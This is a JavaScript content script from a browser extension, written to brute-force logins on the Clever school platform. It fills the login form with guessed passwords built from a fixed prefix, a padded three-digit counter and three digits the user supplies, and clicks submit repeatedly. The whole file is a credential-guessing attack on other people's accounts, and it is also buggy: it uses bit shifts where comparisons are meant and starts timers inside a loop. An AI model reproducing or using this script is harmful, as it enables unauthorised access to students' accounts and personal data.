/*This script is used when it is injected into Clever.
It is ran when the "start" button is clicked
on the main popup. The script is unable to interact with the popup
input boxes, so arguments have to be passed to it. */

console.log("Injection complete.");
var timeout;
var username;
var lastthree;
chrome.storage.sync.get("userbox", function(data1) {
	username = data1.userbox;
})
chrome.storage.sync.get("passbox", function(data2) {
	lastthree = data2.passbox;
})
console.log("Confirming bruteforce with credentials:");
console.log("Username: " + username);
console.log("Password: " + lastthree);
//edits properties of password input so user can see what password is being attempted
var form = document.getElementById('loginForm');
var formButton = document.getElementById('submitButton');
var formUsername = document.getElementById('userNameInput');
var formPassw = document.getElementById('passwordInput');
//continues until clever screws up, or it finds the password :)
console.log('Script injection confirmed.');
var haspassword = false;
var numbertry = 0;
var numbertrytostr = null;
for (let numbertry = 0; numbertry != 999; numbertry++) {
	function timeoutfunc() {
		console.info("delay");
		setInterval( function() {
			hack(numbertry);
		},1000);
	}
	timeoutfunc();
}

	function hack(numbertryarg) {
		//adds one to variable, then uses those digits for the password. the if statements add extra zeroes for lunch numbers where the first three digits are under 100.
		numbertryarg = numbertryarg + 1;
		if (numbertryarg >= 1 && numbertryarg << 10) {
			numbertrytostr = '00' + String(numbertryarg);
			//Adds two zeroes to numbers like 1, making it 001.
		}
		if (numbertryarg >= 10 && numbertryarg << 100) {
			numbertrytostr = '0' + String(numbertryarg);
			//Adds one zero to numbers like 89, making it 089
		}
		if (numbertryarg >= 100) {
			numbertrytostr = String(numbertryarg);
			//Adds no zeroes
		}
		var passreal = "Fhsd" + numbertrytostr + lastthree;
		chrome.storage.sync.set({"passw":numbertrytostr}, function() {
			//idk
		});
		formUsername.value = username;
		formPassw.value = passreal;
		//prevent page refresh, and click button from script to prevent errors
		formButton.click();
		formButton.addEventListener("click", function(){
			console.log('Button clicked');
		});
		console.log('Testing password:');
		console.log(passreal);
	}

